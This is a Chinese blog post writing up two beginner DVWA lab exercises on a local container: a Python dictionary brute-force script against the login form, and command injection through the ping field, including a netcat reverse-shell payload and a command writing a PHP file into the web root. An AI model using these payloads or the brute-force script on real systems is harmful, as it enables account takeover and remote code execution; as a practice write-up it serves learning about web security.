<!doctype html><html lang=zh-cn dir=ltr>
<head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="前言 萌新试玩DVWA，Brute Force 和 Command Injection 两道入门题。
Brute Force 信息收集 表单很简单，尝试随便给个用户名密码会报错。
出于基本的好奇和联想（不要联想）试了下admin和password（就是DVWA默认的登陆密码），发现这就是正确密码了。
好吧，猜出来也算。但题目是 Brute Force，所以本意应该是整一个暴力破解的脚本什么的吧，像是公网上天天扫 22 端口尝试弱密码的机器人一样。
出于这样的想法，再看下表单怎么提交的，能不能直接写个脚本发 HTTP 请求搞定。
再看下网络请求。
用户名密码直接放在 QueryString 里，看起来也没什么保护，既然这样自己构造请求就很轻松愉快了。
准备 暴力破解也有暴力破解的技巧。
可接受的输入长度在有限区间的情况下，直接遍历所有字母数字特殊字符组合是很难顶的，每多一位可能的密码数量都是指数上升。比如最短 6 位密码，接受 ASCII 127 个字符，就有 127^6 种可能的密码，最长 16 位密码就是 127^16，每次尝试花费 1ms 的话，所需时间可以达到 1.44E+38 年这么久。
但人不可能真的随机从ascii码表里随机抽取字符当密码，所以暴力破解其实只需要尝试比较常见的密码就行（比如生日、名字、单词、有规律的数字以及这些元素的组合），还可以选择从其他已泄露的网站里保存的用户名密码来“撞库”碰运气。
这种“弱密码”构成的表在网上还是比较容易找到的。实在不行可以自己现编一个，比如直接英语词典、日期、常见姓名凑一凑，再找个 20xx 年 top N 弱密码合起来就是个可以一战的弱密码字典了。不过最好还是找个高质量的字典，好的字典排序能让暴力破密码更快（就是从统计（？）上来说越靠前的密码越常用，越可能是正确的密码）。
挑好字典之后，剩下就是直接把这个字典从头到尾试一遍了。这里我随便找了个Weak-password（里面大部分内容不关心也用不到）直接下载 zip。
创建个 dvwa-writeup 仓库用来存 dvwa 题解脚本，把 zip 解压进去。
就是这样。
编写脚本 出于个人偏好，使用 python 编写脚本。
#!/usr/bin/env python3 # # WriteUp: brute force [Security Level: Low] # Author: weak_ptr # # NOTE: require python version &amp;gt;= 3."><title>DVWA上手记录-简单尝试</title>
<link rel=canonical href=https://nnnewb.github.io/blog/p/get-start-dvwa-02/>
<link rel=stylesheet href=/blog/scss/style.min.b80bf249ce4a22cf55e8d7340a0b37a2f2c10f54f3a9a49cb94b694a2eb0bbea.css><meta property="og:title" content="DVWA上手记录-简单尝试">
<meta property="og:description" content="前言 萌新试玩DVWA，Brute Force 和 Command Injection 两道入门题。
Brute Force 信息收集 表单很简单，尝试随便给个用户名密码会报错。
出于基本的好奇和联想（不要联想）试了下admin和password（就是DVWA默认的登陆密码），发现这就是正确密码了。
好吧，猜出来也算。但题目是 Brute Force，所以本意应该是整一个暴力破解的脚本什么的吧，像是公网上天天扫 22 端口尝试弱密码的机器人一样。
出于这样的想法，再看下表单怎么提交的，能不能直接写个脚本发 HTTP 请求搞定。
再看下网络请求。
用户名密码直接放在 QueryString 里，看起来也没什么保护，既然这样自己构造请求就很轻松愉快了。
准备 暴力破解也有暴力破解的技巧。
可接受的输入长度在有限区间的情况下，直接遍历所有字母数字特殊字符组合是很难顶的，每多一位可能的密码数量都是指数上升。比如最短 6 位密码，接受 ASCII 127 个字符，就有 127^6 种可能的密码，最长 16 位密码就是 127^16，每次尝试花费 1ms 的话，所需时间可以达到 1.44E+38 年这么久。
但人不可能真的随机从ascii码表里随机抽取字符当密码，所以暴力破解其实只需要尝试比较常见的密码就行（比如生日、名字、单词、有规律的数字以及这些元素的组合），还可以选择从其他已泄露的网站里保存的用户名密码来“撞库”碰运气。
这种“弱密码”构成的表在网上还是比较容易找到的。实在不行可以自己现编一个，比如直接英语词典、日期、常见姓名凑一凑，再找个 20xx 年 top N 弱密码合起来就是个可以一战的弱密码字典了。不过最好还是找个高质量的字典，好的字典排序能让暴力破密码更快（就是从统计（？）上来说越靠前的密码越常用，越可能是正确的密码）。
挑好字典之后，剩下就是直接把这个字典从头到尾试一遍了。这里我随便找了个Weak-password（里面大部分内容不关心也用不到）直接下载 zip。
创建个 dvwa-writeup 仓库用来存 dvwa 题解脚本，把 zip 解压进去。
就是这样。
编写脚本 出于个人偏好，使用 python 编写脚本。
#!/usr/bin/env python3 # # WriteUp: brute force [Security Level: Low] # Author: weak_ptr # # NOTE: require python version &amp;gt;= 3.">
<meta property="og:url" content="https://nnnewb.github.io/blog/p/get-start-dvwa-02/">
<meta property="og:site_name" content="weakptr's 笔记">
<meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="security"><meta property="article:tag" content="DVWA"><meta property="article:published_time" content="2022-04-24T15:05:00+08:00"><meta property="article:modified_time" content="2022-04-24T15:05:00+08:00">
<meta name=twitter:title content="DVWA上手记录-简单尝试">
<meta name=twitter:description content="前言 萌新试玩DVWA，Brute Force 和 Command Injection 两道入门题。
Brute Force 信息收集 表单很简单，尝试随便给个用户名密码会报错。
出于基本的好奇和联想（不要联想）试了下admin和password（就是DVWA默认的登陆密码），发现这就是正确密码了。
好吧，猜出来也算。但题目是 Brute Force，所以本意应该是整一个暴力破解的脚本什么的吧，像是公网上天天扫 22 端口尝试弱密码的机器人一样。
出于这样的想法，再看下表单怎么提交的，能不能直接写个脚本发 HTTP 请求搞定。
再看下网络请求。
用户名密码直接放在 QueryString 里，看起来也没什么保护，既然这样自己构造请求就很轻松愉快了。
准备 暴力破解也有暴力破解的技巧。
可接受的输入长度在有限区间的情况下，直接遍历所有字母数字特殊字符组合是很难顶的，每多一位可能的密码数量都是指数上升。比如最短 6 位密码，接受 ASCII 127 个字符，就有 127^6 种可能的密码，最长 16 位密码就是 127^16，每次尝试花费 1ms 的话，所需时间可以达到 1.44E+38 年这么久。
但人不可能真的随机从ascii码表里随机抽取字符当密码，所以暴力破解其实只需要尝试比较常见的密码就行（比如生日、名字、单词、有规律的数字以及这些元素的组合），还可以选择从其他已泄露的网站里保存的用户名密码来“撞库”碰运气。
这种“弱密码”构成的表在网上还是比较容易找到的。实在不行可以自己现编一个，比如直接英语词典、日期、常见姓名凑一凑，再找个 20xx 年 top N 弱密码合起来就是个可以一战的弱密码字典了。不过最好还是找个高质量的字典，好的字典排序能让暴力破密码更快（就是从统计（？）上来说越靠前的密码越常用，越可能是正确的密码）。
挑好字典之后，剩下就是直接把这个字典从头到尾试一遍了。这里我随便找了个Weak-password（里面大部分内容不关心也用不到）直接下载 zip。
创建个 dvwa-writeup 仓库用来存 dvwa 题解脚本，把 zip 解压进去。
就是这样。
编写脚本 出于个人偏好，使用 python 编写脚本。
#!/usr/bin/env python3 # # WriteUp: brute force [Security Level: Low] # Author: weak_ptr # # NOTE: require python version &amp;gt;= 3.">
</head>
<body class=article-page>
<script>(function(){const a='StackColorScheme';localStorage.getItem(a)||localStorage.setItem(a,"dark")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky">
<button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
<span class=hamburger-box>
<span class=hamburger-inner></span>
</span>
</button>
<header>
<figure class=site-avatar>
<a href=/blog>
<img src=/blog/img/avatar_hub37949326d1692892aa1e64434c0dda6_382115_300x0_resize_box_3.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
</a>
<span class=emoji>🍑</span>
</figure>
<div class=site-meta>
<h1 class=site-name><a href=/blog>weakptr's 笔记</a></h1>
<h2 class=site-description>弃船！</h2>
</div>
</header><ol class=menu id=main-menu>
<li>
<a href=/blog><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>首页</span>
</a>
</li>
<li>
<a href=/blog/about><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>关于我</span>
</a>
</li>
<li>
<a href=/blog/archive><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>归档</span>
</a>
</li>
<li>
<a href=/blog/categories><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
<span>分类</span>
</a>
</li>
<li>
<a href=/blog/link><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>友链</span>
</a>
</li>
<div class=menu-bottom-section>
<li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>暗色模式</span>
</li>
</div>
</ol>
</aside>
<main class="main full-width">
<article class=main-article>
<header class=article-header>
<div class=article-details>
<header class=article-category>
<a href=/blog/categories/security/>
security
</a>
</header>
<div class=article-title-wrapper>
<h2 class=article-title>
<a href=/blog/p/get-start-dvwa-02/>DVWA上手记录-简单尝试</a>
</h2>
</div>
<footer class=article-time>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>2022年 4月 24日</time>
</div>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>
阅读时长: 7 分钟
</time>
</div>
</footer>
</div>
</header>
<section class=article-content>
<h2 id=前言>前言</h2>
<p>萌新试玩DVWA，Brute Force 和 Command Injection 两道入门题。</p>
<h2 id=brute-force>Brute Force</h2>
<h3 id=信息收集>信息收集</h3>
<p><img src=/blog/p/get-start-dvwa-02/image-20220421165951469.png width=678 height=310 srcset="/blog/p/get-start-dvwa-02/image-20220421165951469_hu968bfbff7b3908a335da7115c389096f_24097_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220421165951469_hu968bfbff7b3908a335da7115c389096f_24097_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220421165951469 class=gallery-image data-flex-grow=218 data-flex-basis=524px></p>
<p>表单很简单，尝试随便给个用户名密码会报错。</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220421170044746.png width=293 height=208 srcset="/blog/p/get-start-dvwa-02/image-20220421170044746_hu922d70c9fe48b32784873287834092d4_5047_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220421170044746_hu922d70c9fe48b32784873287834092d4_5047_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220421170044746 class=gallery-image data-flex-grow=140 data-flex-basis=338px></p>
<p>出于基本的好奇和联想（不要联想）试了下<code>admin</code>和<code>password</code>（就是DVWA默认的登陆密码），发现这就是正确密码了。</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220421170146718.png width=349 height=273 srcset="/blog/p/get-start-dvwa-02/image-20220421170146718_hubdd8467726ec153ca4f4cd266c83a5da_24326_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220421170146718_hubdd8467726ec153ca4f4cd266c83a5da_24326_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220421170146718 class=gallery-image data-flex-grow=127 data-flex-basis=306px></p>
<p>好吧，猜出来也算。但题目是 Brute Force，所以本意应该是整一个暴力破解的脚本什么的吧，像是公网上天天扫 22 端口尝试弱密码的机器人一样。</p>
<p>出于这样的想法，再看下表单怎么提交的，能不能直接写个脚本发 HTTP 请求搞定。</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220421170531288.png width=431 height=198 srcset="/blog/p/get-start-dvwa-02/image-20220421170531288_hu7f69ddf94bb81e659ec24c8688d64b22_14037_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220421170531288_hu7f69ddf94bb81e659ec24c8688d64b22_14037_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220421170531288 class=gallery-image data-flex-grow=217 data-flex-basis=522px></p>
<p>再看下网络请求。</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220421170720287.png width=1393 height=469 srcset="/blog/p/get-start-dvwa-02/image-20220421170720287_huc75cdf68db8e6c3f9a6464185546fd97_67655_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220421170720287_huc75cdf68db8e6c3f9a6464185546fd97_67655_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220421170720287 class=gallery-image data-flex-grow=297 data-flex-basis=712px></p>
<p>用户名密码直接放在 QueryString 里，看起来也没什么保护，既然这样自己构造请求就很轻松愉快了。</p>
<h3 id=准备>准备</h3>
<p>暴力破解也有暴力破解的技巧。</p>
<p>可接受的输入长度在有限区间的情况下，直接遍历所有字母数字特殊字符组合是很难顶的，每多一位可能的密码数量都是指数上升。比如最短 6 位密码，接受 ASCII 127 个字符，就有 127^6 种可能的密码，最长 16 位密码就是 127^16，每次尝试花费 1ms 的话，所需时间可以达到 1.44E+38 年这么久。</p>
<p>但人不可能真的随机从ascii码表里随机抽取字符当密码，所以暴力破解其实只需要尝试比较常见的密码就行（比如生日、名字、单词、有规律的数字以及这些元素的组合），还可以选择从其他已泄露的网站里保存的用户名密码来“撞库”碰运气。</p>
<p>这种“弱密码”构成的表在网上还是比较容易找到的。实在不行可以自己现编一个，比如直接英语词典、日期、常见姓名凑一凑，再找个 20xx 年 top N 弱密码合起来就是个可以一战的弱密码字典了。不过最好还是找个高质量的字典，好的字典排序能让暴力破密码更快（就是从统计（？）上来说越靠前的密码越常用，越可能是正确的密码）。</p>
<p>挑好字典之后，剩下就是直接把这个字典从头到尾试一遍了。这里我随便找了个<a class=link href=https://github.com/TgeaUs/Weak-password/ target=_blank rel=noopener>Weak-password</a>（里面大部分内容不关心也用不到）直接下载 zip。</p>
<p>创建个 <code>dvwa-writeup</code> 仓库用来存 dvwa 题解脚本，把 zip 解压进去。</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220422092243142.png width=291 height=359 srcset="/blog/p/get-start-dvwa-02/image-20220422092243142_hu2c6ed95d30405302f7bb95a50c5238af_19893_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220422092243142_hu2c6ed95d30405302f7bb95a50c5238af_19893_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220422092243142 class=gallery-image data-flex-grow=81 data-flex-basis=194px></p>
<p>就是这样。</p>
<h3 id=编写脚本>编写脚本</h3>
<p>出于个人偏好，使用 python 编写脚本。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=ch>#!/usr/bin/env python3</span>
<span class=c1>#</span>
<span class=c1># WriteUp: brute force [Security Level: Low]</span>
<span class=c1># Author: weak_ptr</span>
<span class=c1>#</span>
<span class=c1># NOTE: require python version &gt;= 3.6</span>
<span class=c1>#</span>

<span class=kn>import</span> <span class=nn>requests</span>

<span class=n>dictionary_list</span> <span class=o>=</span> <span class=p>[</span>
    <span class=s1>&#39;Weak-password/Password dictionary/常用密码.dict&#39;</span><span class=p>,</span>
    <span class=s1>&#39;Weak-password/Password dictionary/国外常用密码.dict&#39;</span><span class=p>,</span>
<span class=p>]</span>

<span class=k>for</span> <span class=n>path</span> <span class=ow>in</span> <span class=n>dictionary_list</span><span class=p>:</span>
    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;[+] open dict: </span><span class=si>{</span><span class=n>path</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
        <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>f</span><span class=p>:</span>
            <span class=n>pwd</span> <span class=o>=</span> <span class=n>line</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
            <span class=n>resp</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span>
                <span class=sa>f</span><span class=s1>&#39;http://localhost:8080/vulnerabilities/brute/?username=admin&amp;password=</span><span class=si>{</span><span class=n>pwd</span><span class=si>}</span><span class=s1>&amp;Login=Login#&#39;</span><span class=p>,</span>
                <span class=n>cookies</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;PHPSESSID&#39;</span><span class=p>:</span> <span class=s1>&#39;t6kml64lvsbd8909fkrh51ove0&#39;</span><span class=p>,</span> <span class=s1>&#39;security&#39;</span><span class=p>:</span> <span class=s1>&#39;low&#39;</span><span class=p>})</span>
            <span class=c1># 太粗暴</span>
            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;[-] try password: </span><span class=si>{</span><span class=n>pwd</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
            <span class=k>if</span> <span class=s1>&#39;Username and/or password incorrect.&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>resp</span><span class=o>.</span><span class=n>content</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>):</span>
                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;[+] Done! password is </span><span class=si>{</span><span class=nb>repr</span><span class=p>(</span><span class=n>pwd</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
                <span class=k>break</span>
        <span class=k>else</span><span class=p>:</span>
            <span class=k>continue</span>
        <span class=k>break</span>
</code></pre></div><p>运行后：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext>[+] open dict: Weak-password/Password dictionary/常用密码.dict
[-] try password: admin
[-] try password: admin12
[-] try password: admin888
[-] try password: admin8
[-] try password: admin123
[-] try password: sysadmin
[-] try password: adminxxx
[-] try password: adminx
[-] try password: 6kadmin
[-] try password: base
[-] try password: feitium
[-] try password: admins
[-] try password: root
[-] try password: roots
[-] try password: test
[-] try password: test1
[-] try password: test123
[-] try password: test2
[-] try password: password
[+] Done! password is &#39;password&#39;
</code></pre></div><p>值得注意的是不清楚是不是因为我跑在容器里而且虚拟机只分配了 2C 1G 的缘故，每次尝试密码耗时都接近 1s。放在真实场景下，服务端如果限制了请求频率（或者把每个请求都用固定时间返回，如 1s），破解成本会骤然提高（不过对服务器来说固定返回时间也是有不低的成本的）。</p>
<h3 id=提高难度>提高难度</h3>
<p>尝试把安全等级提高到 Medium 和 High 对暴力破解并没有什么用，不清楚是不是因为虚拟机太慢，单线程爆破没触发频率限制。但总之是和 Low 难度下没什么区别。</p>
<p>提高到 Impossible ，开启 PHPIDS 也无济于事。</p>
<p>可见系统设计再安全也顶不住人为因素，保险箱钥匙放在地毯下面的时候就算保险箱是振金做的也防不住贼啊。</p>
<h2 id=command-injection>Command Injection</h2>
<h3 id=信息收集-1>信息收集</h3>
<p><img src=/blog/p/get-start-dvwa-02/image-20220422101128288.png width=690 height=270 srcset="/blog/p/get-start-dvwa-02/image-20220422101128288_hudbc3e0ef08e95f39b0817c51ecb3343a_23969_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220422101128288_hudbc3e0ef08e95f39b0817c51ecb3343a_23969_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220422101128288 class=gallery-image data-flex-grow=255 data-flex-basis=613px></p>
<p>介绍是 ping a device，尝试输入 localhost 提交：</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220422101215860.png width=669 height=389 srcset="/blog/p/get-start-dvwa-02/image-20220422101215860_hu73799ffa0ce1f097b18a79596df7ca58_29483_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220422101215860_hu73799ffa0ce1f097b18a79596df7ca58_29483_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220422101215860 class=gallery-image data-flex-grow=171 data-flex-basis=412px></p>
<p>应该是执行了 <code>ping -c 4 &lt;用户输入></code>。尝试随便输入什么东西会不会报错。</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220422101354634.png width=673 height=263 srcset="/blog/p/get-start-dvwa-02/image-20220422101354634_hu858a6ebf2ce93a4713cb7043282bcd66_24133_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220422101354634_hu858a6ebf2ce93a4713cb7043282bcd66_24133_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220422101354634 class=gallery-image data-flex-grow=255 data-flex-basis=614px></p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220422101405231.png width=689 height=283 srcset="/blog/p/get-start-dvwa-02/image-20220422101405231_hua6af44221cab3062ad11653bd178989c_24076_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220422101405231_hua6af44221cab3062ad11653bd178989c_24076_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220422101405231 class=gallery-image data-flex-grow=243 data-flex-basis=584px></p>
<p>立刻返回了，什么也没发生。再尝试拼一个命令进去：<code>localhost && echo 123</code></p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220422101538861.png width=679 height=411 srcset="/blog/p/get-start-dvwa-02/image-20220422101538861_hu8cdc8bc306ca76b2f4e643fe09f8e1bb_29778_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220422101538861_hu8cdc8bc306ca76b2f4e643fe09f8e1bb_29778_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220422101538861 class=gallery-image data-flex-grow=165 data-flex-basis=396px></p>
<p>注意到末尾输出了 123，说明存在命令执行。</p>
<h3 id=准备-1>准备</h3>
<p>能执行任意命令的话，悬念就不大了，进可攻退可守。</p>
<p>对 <code>/var/www/html</code> 有写权限的话可以直接写个一句话木马，或者通过 <code>nc</code> 命令反弹 shell。</p>
<p>顺便一体 nc 反弹 shell 我并不会（手动狗头）。所以还得先学一学怎么用 nc 反弹 shell，到底啥原理。</p>
<p>先 <code>man nc</code> 看看手册。</p>
<blockquote>
<p>NAME</p>
<p>​ nc - TCP/IP swiss army knife</p>
<p>SYNOPSIS</p>
<p>​ nc [-options] hostname port[s] [ports] &mldr;</p>
<p>​ nc -l -p port [-options] [hostname] [port]</p>
</blockquote>
<p>嘶&mldr;&mldr;</p>
<p>TCP/IP 瑞士军刀诶。</p>
<blockquote>
<p>netcat is a simple unix utility which reads and writes data across network connections, using TCP or UDP protocol. It is designed to be a reliable &ldquo;back-end&rdquo; tool that can be used directly or easily driven by other programs and scripts. At the same time, it is a feature-rich network debugging and exploration tool, since it can create almost any kind of connection you would need and has several interesting built-in capabilities. Netcat, or &ldquo;nc&rdquo; as the actual program is named, should have been supplied long ago as another one of those cryptic but standard Unix tools.</p>
</blockquote>
<p>netcat（我就管它叫网猫了），看介绍是一个可以被其他程序或者脚本驱动的“后端”工具，也是网络调试和探索工具，能创建几乎所有类型的连接。这么说感觉还有点迷惑，看后文介绍就清楚多了。</p>
<blockquote>
<p>In the simplest usage, &ldquo;nc host port&rdquo; creates a TCP connection to the given port on the given target host. Your standard input is then sent to the host, and anything that comes back across the connection is sent to your standard output. This continues indefinitely, until the network side of the connection shuts down. Note that this behavior is different from most other applications which shut everything down and exit after an end-of-file on the standard input.</p>
<p>Netcat can also function as a server, by listening for inbound connections on arbitrary ports and then doing the same reading and writing. With minor limitations, netcat doesn&rsquo;t really care if it runs in &ldquo;client&rdquo; or &ldquo;server&rdquo; mode &ndash; it still shovels data back and forth until there isn&rsquo;t any more left. In either mode, shutdown can be forced after a configurable time of inactivity on the network side.</p>
</blockquote>
<p>概括下值得关注的部分，就是网猫的两种工作模式。客户端模式下把 stdin 用连接转发，同时把收到的消息写到 stdout；服务器模式监听端口，同样转发 stdin 并把收到的消息写到 stdout 。</p>
<p>剩下比较重要的就是几个命令行选项：</p>
<ul>
<li><code>-l</code> 指示网猫在服务器模式下工作，监听一个指定端口。</li>
<li><code>-e</code> 指示网猫在连接后运行一个程序，程序的输入会变成从连接收到的信息，程序的输出会从连接发送出去。</li>
<li><code>-s</code> 指示网猫监听的本地地址。</li>
</ul>
<p>可以做个简单的实验熟悉下命令的使用，用 tmux 按 <code>ctrl+b</code> <code>"</code> <code>ctrl+b</code> <code>%</code> 切分两个窗口出来，一边执行 <code>nc -l -s 0.0.0.0 -p 12345</code> 另一边执行 <code>nc localhost 12345</code>。</p>
<p>在执行 <code>nc localhost 12345</code> 的这边网猫工作在客户端模式下，可以自由尝试在两边键盘输入什么东西，另一边都会实时回显：</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220422134806970.png width=1253 height=110 srcset="/blog/p/get-start-dvwa-02/image-20220422134806970_hue4c2b6d980755bce46f80b71b58199b9_168449_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220422134806970_hue4c2b6d980755bce46f80b71b58199b9_168449_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220422134806970 class=gallery-image data-flex-grow=1139 data-flex-basis=2733px></p>
<p>现在解释网猫反向shell就很简单了，用 <code>nc localhost 12345 -e /bin/sh</code> 连接服务器，此时 <code>/bin/sh</code> 的输入输出被接管，我们在服务端输入 <code>ls</code>，客户端的 <code>/bin/sh</code> 读到的输入就是 <code>ls</code>，<code>/bin/sh</code> 执行 <code>ls</code> 的结果又返回到服务端——<code>nc</code>客户端就成了一个类似sshd的角色，故称反向连接。</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220422135301963.png width=799 height=204 srcset="/blog/p/get-start-dvwa-02/image-20220422135301963_hu5f0c0379ce9d698f046ca7a92259ac1e_234796_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220422135301963_hu5f0c0379ce9d698f046ca7a92259ac1e_234796_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220422135301963 class=gallery-image data-flex-grow=391 data-flex-basis=940px></p>
<h3 id=构造-payload>构造 payload</h3>
<p>先尝试用网猫反向连接。输入内容改成 <code>localhost && nc &lt;ip> &lt;port> -e /bin/sh &</code> ，等待连接。</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220422135847026.png width=341 height=41 srcset="/blog/p/get-start-dvwa-02/image-20220422135847026_hu8aca9c9f3b1ddcde7b50574d9ad5b6e8_10075_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220422135847026_hu8aca9c9f3b1ddcde7b50574d9ad5b6e8_10075_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220422135847026 class=gallery-image data-flex-grow=831 data-flex-basis=1996px></p>
<p>没成功。网页显示 ping 命令的输出，看了眼 dvwa 容器的日志发现提示没有<code>nc</code>命令。</p>
<p>好吧，上面那么多话到最后还是没有屁用。那就改成提交一个 php 一句话。输入内容改为 <code>localhost && echo '&lt;?php phpinfo(); ?>' > /var/www/html/1.php</code>，然后访问 <code>http://localhost:8080/1.php</code>，发现成功显示 phpinfo，done。</p>
